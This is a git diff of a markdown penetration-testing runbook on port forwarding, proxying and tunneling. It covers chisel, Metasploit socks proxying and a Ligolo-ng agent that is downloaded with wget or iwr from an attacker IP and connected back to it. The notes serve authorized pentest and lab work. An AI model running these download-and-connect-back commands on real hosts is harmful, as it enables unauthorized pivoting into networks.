@@ -1,10 +1,14 @@
-# Port Fowarding and Proxying
+# Tunneling
+<!--- Status 90% --->
+<!--- Maybe add another tunneling agent --->
 
 ## Introduction
 
+This runbook provides a guide to tunneling. It includes a variety of techniques and tools for port forwading, using a proxy, and setting up tunnels with agents.
+
 ## Table of Content
 
-- [Port Fowarding and Proxying](#port-fowarding-and-proxying)
+- [Tunneling](#tunneling)
   - [Introduction](#introduction)
   - [Table of Content](#table-of-content)
   - [Port Fowarding](#port-fowarding)
@@ -20,7 +24,7 @@
     - [chisel  - Reverse Proxy](#chisel----reverse-proxy)
     - [chisel - Forward Proxy](#chisel---forward-proxy)
     - [metasploit - proxying](#metasploit---proxying)
-  - [Tunneling](#tunneling)
+  - [Tunneling with an aganet](#tunneling-with-an-aganet)
     - [Ligolo](#ligolo)
 
 ## Port Fowarding
@@ -108,7 +112,7 @@ Host
 ./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
 ```
 
-### metasploit - proxying 
+### metasploit - proxying
 
 ```sh
 route add <ip>/24 1
@@ -117,20 +121,21 @@ use auxiliary/server/socks_proxy
 run
 ```
 
-## Tunneling
+## Tunneling with an aganet
 
-### Ligolo
+### [Ligolo](https://github.com/nicocha30/ligolo-ng)
 
-[about]( https://github.com/nicocha30/ligolo-ng)
 ```sh
 # kali
-sudo ip tuntap add user [your_username] mode tun ligolo
+sudo ip tuntap add user <user> mode tun ligolo
 sudo ip link set ligolo up
 ligolo-proxy -selfcert -laddr 0.0.0.0:<port>
 sudo ip route add <ip-range> dev ligolo
 ```
 ```
-# windows or host
+# host
+wget http://<ip>/<linuxagent>
+OR
 iwr -uri http://<ip>/agent.exe -Outfile agent.exe
 agent.exe -connect <attacker IP here>:<port> -ignore-cert
 ```
@@ -140,4 +145,4 @@ session
 start
 ```
 
- <!--- Last Updated July 8, 2024 --->
+ <!--- Last Updated July 9, 2024 --->
